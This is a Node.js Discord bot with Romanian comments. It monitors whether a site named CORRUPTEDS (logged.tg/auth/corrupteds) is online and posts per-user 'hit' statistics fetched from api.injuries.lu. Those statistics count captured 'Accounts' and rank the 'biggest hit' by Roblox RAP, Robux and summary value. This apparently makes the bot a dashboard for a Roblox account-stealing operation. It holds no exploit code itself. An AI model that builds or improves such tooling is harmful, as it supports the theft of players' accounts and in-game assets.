// 1️⃣ Importuri
const { Client, GatewayIntentBits, EmbedBuilder } = require('discord.js');
const fetch = require('node-fetch');

// 2️⃣ Creezi clientul Discord
const client = new Client({ 
  intents: [
    GatewayIntentBits.Guilds, 
    GatewayIntentBits.GuildMessages, 
    GatewayIntentBits.MessageContent
  ] 
});

const TOKEN = process.env.DISCORD_BOT_TOKEN;

// 3️⃣ Eveniment ready
client.once('ready', () => {
  console.log(`✅ Bot ready as ${client.user.tag}`);
});

// 4️⃣ Funcții utile
function formatNumber(num) { return num?.toLocaleString() || "0"; }
function formatDuration(ms) {
  let sec = Math.floor(ms / 1000);
  let min = Math.floor(sec / 60);
  let hr = Math.floor(min / 60);
  sec %= 60; min %= 60;
  return `${hr}h ${min}m ${sec}s`;
}

// 5️⃣ Config Uptime Monitor
let lastUpTime = null;
let lastStatus = null;
const STATUS_CHANNEL_ID = "1436098432413597726";
const MAIN_SITE_URL = "https://www.logged.tg/auth/corrupteds";
const MAIN_SITE_NAME = "CORRUPTEDS";

// 5.1️⃣ Monitor site la fiecare 30 secunde
setInterval(async () => {
  try {
    const start = Date.now();
    let res, ping;
    try { 
      const response = await fetch(MAIN_SITE_URL); 
      res = { ok: response.ok }; 
      ping = Date.now() - start; 
    } catch { 
      res = { ok: false }; 
      ping = null; 
    }

    let currentStatus = res.ok ? "UP" : "DOWN";
    if (res.ok && !lastUpTime) lastUpTime = Date.now();
    if (!res.ok) lastUpTime = null;

    if (currentStatus !== lastStatus) {
      const channel = client.channels.cache.get(STATUS_CHANNEL_ID);
      if (channel) {
        const embed = new EmbedBuilder()
          .setColor(0x00BFFF) // baby blue
          .setThumbnail("https://cdn.discordapp.com/emojis/1437165310775132160.gif") // coroana animata
          .setDescription(
            `<a:emoji_21:1437163698161717468> **SITE STATUS**\n\n` +
            `<a:emoji_21:1437163698161717468> **${MAIN_SITE_NAME}**\n` +
            `<a:emoji_21:1437163698161717468> STATUS: ${currentStatus}\n` +
            `<a:emoji_21:1437163698161717468> Response Time: ${ping ? ping + "ms" : "N/A"}`
          )
          .setImage("https://i.imgur.com/rCQ33gA.gif") // banner jos
          .setFooter({ text: "Site Uptime Monitor" });

        await channel.send({ embeds: [embed] });
      }
      lastStatus = currentStatus;
    }

  } catch (err) { console.error("Error checking site:", err); }
}, 30000);

// 6️⃣ Mesaje
client.on('messageCreate', async (message) => {
  if (message.author.bot) return;

  const targetUser = message.mentions.users.first() || message.author;
  const targetId = targetUser.id;

  // ===== !stats =====
  if (message.content.startsWith('!stats')) {
    try {
      const res = await fetch(`https://api.injuries.lu/v1/public/user?userId=${targetId}`);
      const data = await res.json();
      if (!data.success || !data.Normal) return message.reply("❌ No stats found for this user.");

      const normal = data.Normal;
      const profile = data.Profile || {};
      const userName = profile.userName || targetUser.username;

      const embed = new EmbedBuilder()
        .setColor(0x00BFFF)
        .setThumbnail("https://cdn.discordapp.com/emojis/1437165310775132160.gif") // coroana
        .setDescription(
          `<a:emoji_23:1437165438315532431> **─── NORMAL INFO ───**\n\n` +
          `<a:emoji_21:1437163698161717468> **User:** ${userName}\n\n` +
          `<a:emoji_21:1437163698161717468> **TOTAL STATS:**\n` +
          `Hits: ${formatNumber(normal.Totals?.Accounts)}\n` +
          `Visits: ${formatNumber(normal.Totals?.Visits)}\n` +
          `Clicks: ${formatNumber(normal.Totals?.Clicks)}\n\n` +
          `<a:emoji_21:1437163698161717468> **BIGGEST HIT:**\n` +
          `Summary: ${formatNumber(normal.Highest?.Summary)}\n` +
          `RAP: ${formatNumber(normal.Highest?.Rap)}\n` +
          `Robux: ${formatNumber(normal.Highest?.Balance)}\n\n` +
          `<a:emoji_21:1437163698161717468> **TOTAL HIT STATS:**\n` +
          `Summary: ${formatNumber(normal.Totals?.Summary)}\n` +
          `RAP: ${formatNumber(normal.Totals?.Rap)}\n` +
          `Robux: ${formatNumber(normal.Totals?.Balance)}`
        )
        .setImage("https://i.imgur.com/rCQ33gA.gif") // banner jos
        .setFooter({ text: "Stats Bot" });

      await message.channel.send({ embeds: [embed] });

    } catch (err) { console.error(err); message.reply("❌ Error fetching stats."); }
  }

  // ===== !daily =====
  if (message.content.startsWith('!daily')) {
    try {
      const res = await fetch(`https://api.injuries.lu/v2/daily?type=0x2&cs=3&ref=corrupteds&userId=${targetId}`);
      const data = await res.json();
      if (!data.success) return message.reply("❌ No daily stats available.");

      const daily = data.Daily || data.Normal;
      const profile = data.Profile || {};
      const userName = profile.userName || targetUser.username;

      const embed = new EmbedBuilder()
        .setColor(0x00BFFF)
        .setThumbnail("https://cdn.discordapp.com/emojis/1437165310775132160.gif") // coroana
        .setDescription(
          `<a:emoji_23:1437165438315532431> **─── DAILY STATS ───**\n\n` +
          `<a:emoji_21:1437163698161717468> **User:** ${userName}\n\n` +
          `<a:emoji_21:1437163698161717468> **DAILY STATS:**\n` +
          `Hits: ${formatNumber(daily.Totals?.Accounts)}\n` +
          `Visits: ${formatNumber(daily.Totals?.Visits)}\n` +
          `Clicks: ${formatNumber(daily.Totals?.Clicks)}\n\n` +
          `<a:emoji_21:1437163698161717468> **BIGGEST HIT:**\n` +
          `Summary: ${formatNumber(daily.Highest?.Summary)}\n` +
          `RAP: ${formatNumber(daily.Highest?.Rap)}\n` +
          `Robux: ${formatNumber(daily.Highest?.Balance)}\n\n` +
          `<a:emoji_21:1437163698161717468> **TOTAL HIT STATS:**\n` +
          `Summary: ${formatNumber(daily.Totals?.Summary)}\n` +
          `RAP: ${formatNumber(daily.Totals?.Rap)}\n` +
          `Robux: ${formatNumber(daily.Totals?.Balance)}`
        )
        .setImage("https://i.imgur.com/rCQ33gA.gif") // banner jos
        .setFooter({ text: "Stats Bot Daily" });

      await message.channel.send({ embeds: [embed] });

    } catch (err) { console.error(err); message.reply("❌ Error fetching daily stats."); }
  }

  // ===== !check =====
  if (message.content.startsWith('!check')) {
    try {
      const start = Date.now();
      let res, ping;
      try { const response = await fetch(MAIN_SITE_URL); res = { ok: response.ok }; ping = Date.now() - start; } 
      catch { res = { ok: false }; ping = null; }

      let statusText = res.ok ? "**ONLINE**" : "OFFLINE";
      let uptimeText = res.ok && lastUpTime ? `UP for ${formatDuration(Date.now() - lastUpTime)}` : "❌ No uptime data";

      const embed = new EmbedBuilder()
        .setColor(0x00BFFF)
        .setThumbnail("https://cdn.discordapp.com/emojis/1437165310775132160.gif") // coroana
        .setDescription(
          `<a:emoji_23:1437165438315532431> **SITE STATUS**\n\n` +
          `<a:emoji_21:1437163698161717468> **${MAIN_SITE_NAME}**\n` +
          `<a:emoji_21:1437163698161717468> STATUS: ${statusText}\n` +
          `<a:emoji_21:1437163698161717468> UPTIME: ${uptimeText}\n` +
          `<a:emoji_21:1437163698161717468> Response Time: ${ping ? ping + "ms" : "N/A"}`
        )
        .setImage("https://i.imgur.com/rCQ33gA.gif") // banner jos
        .setFooter({ text: "Site Uptime Monitor" });

      await message.channel.send({ embeds: [embed] });

    } catch (err) {
      console.error(err);
      const embed = new EmbedBuilder()
        .setColor(0x00BFFF)
        .setThumbnail("https://cdn.discordapp.com/emojis/1437165310775132160.gif")
        .setDescription(
          `<a:emoji_23:1437165438315532431> **SITE STATUS**\n\n` +
          `<a:emoji_21:1437163698161717468> **${MAIN_SITE_NAME}**\n` +
          `<a:emoji_21:1437163698161717468> STATUS: OFFLINE\n` +
          `<a:emoji_21:1437163698161717468> UPTIME: No uptime data`
        )
        .setImage("https://i.imgur.com/rCQ33gA.gif")
        .setFooter({ text: "Site Uptime Monitor" });

      await message.channel.send({ embeds: [embed] });
    }
  }
});

// 7️⃣ Error handler
client.on('error', (error) => console.error('Discord client error:', error));

// 8️⃣ Verificare token
if (!TOKEN) { console.error('❌ DISCORD_BOT_TOKEN is not set!'); process.exit(1); }

// 9️⃣ Login bot
client.login(TOKEN);
